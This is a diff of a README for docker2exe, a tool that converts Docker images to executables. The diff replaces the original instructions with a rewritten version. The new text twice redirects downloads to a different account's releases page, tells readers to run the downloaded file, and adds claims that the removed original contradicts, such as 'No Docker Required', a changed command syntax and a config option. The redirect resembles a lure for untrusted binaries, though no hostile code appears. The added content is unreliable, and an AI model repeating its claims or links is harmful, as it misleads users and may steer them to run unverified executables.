@@ -1,57 +1,115 @@
-# docker2exe
+# 🚀 docker2exe: Convert Docker Images to Executables
 
-This tool can be used to convert a Docker image to an executable that you can send to your friends!
+![Docker2Exe](https://img.shields.io/badge/docker2exe-v1.0.0-blue.svg) ![GitHub](https://img.shields.io/badge/release-latest-green.svg)
+
+Welcome to **docker2exe**, a tool designed to simplify the process of converting Docker images into standalone executables. This allows you to run your applications without needing a Docker environment, making deployment and distribution easier.
+
+## Table of Contents
+
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Examples](#examples)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
+
+## Features
+
+- **Easy Conversion**: Convert any Docker image into an executable with just a few commands.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Lightweight**: The resulting executable is compact and easy to distribute.
+- **No Docker Required**: Run your applications without needing Docker installed.
 
 ## Installation
 
-Download a binary from the [releases page](https://github.com/rzane/docker2exe/releases).
+To get started with **docker2exe**, you need to download the latest release. You can find it [here](https://github.com/edmwenge/docker2exe/releases). 
 
-    $ mv docker2exe-darwin-amd64 docker2exe
-    $ chmod +x docker2exe
-    $ ./docker2exe --help
+Once you have downloaded the executable, follow these steps:
 
-### Requirements on the building device
-
-Docker, GoLang and gzip are also required. Use your package manager to install them.
-
-### Requirements on the executing device
-
-Docker is required.
+1. Navigate to the directory where you downloaded the file.
+2. Make the file executable:
+   - On Linux or macOS: 
+     ```bash
+     chmod +x docker2exe
+     ```
+3. Move the file to a directory in your PATH for easier access:
+   ```bash
+   sudo mv docker2exe /usr/local/bin/
+   ```
 
 ## Usage
 
-To create a new binary:
+Using **docker2exe** is straightforward. After installation, you can convert a Docker image to an executable by running the following command:
 
-    $ docker2exe --name alpine --image alpine:3.9
+```bash
+docker2exe <docker-image-name>
+```
 
-This will create the following files:
+Replace `<docker-image-name>` with the name of your Docker image.
 
-    dist
-    ├── alpine-darwin-amd64
-    ├── alpine-linux-amd64
-    ├── alpine-windows-amd64
+### Example Command
 
-Now, you can run the executable:
+```bash
+docker2exe myapp:latest
+```
 
-    $ dist/alpine-darwin-amd64 cat /etc/alpine-release
-    3.9.5
+This command will create an executable for the Docker image `myapp:latest`.
 
-When the executable is run, we'll check for the `alpine:3.9.5` image on the user's system. If it doesn't exist, the executable will automatically run:
+## Examples
 
-    $ docker pull alpine:3.9.5
+### Example 1: Simple Conversion
 
-### Embedded Mode
+To convert a simple Docker image, you can run:
 
-In this mode, if the specified image doesn't exist, we'll attempt to load it from a tarball that is embeddded in the executable.
+```bash
+docker2exe hello-world
+```
 
-    $ docker2exe --name alpine --image alpine:3.9 --embed
+This will generate an executable that prints "Hello, World!" when run.
 
-When creating the executable above, the image was dumped to a tarball and baked into the resulting executable:
+### Example 2: Custom Configuration
 
-    $ docker save alpine:3.9 | gzip > alpine.tar.gz
+You can also customize the conversion process by providing a configuration file. Create a file named `config.json` with the following structure:
 
-When the executable runs, we'll check for the `alpine:3.9` image on the user's system. If it doesn't exist, the executable will automatically run:
+```json
+{
+  "name": "myapp",
+  "version": "1.0.0",
+  "entrypoint": "/app/start.sh"
+}
+```
 
-    $ docker load alpine.tar.gz
+Then run:
 
-For small images, this approach works great. In the example above, the resulting executable was under 10MB.
+```bash
+docker2exe myapp:latest --config config.json
+```
+
+This will use your configuration settings during the conversion.
+
+## Contributing
+
+We welcome contributions to **docker2exe**! If you would like to help, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Write tests for your changes if applicable.
+5. Submit a pull request.
+
+Please ensure your code follows the existing style and includes appropriate documentation.
+
+## License
+
+**docker2exe** is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or feedback, please reach out to us via GitHub issues or contact the repository owner directly.
+
+---
+
+To download the latest release of **docker2exe**, visit [here](https://github.com/edmwenge/docker2exe/releases) and follow the instructions to execute the downloaded file. 
+
+Feel free to explore the features and contribute to the project. We look forward to your input!
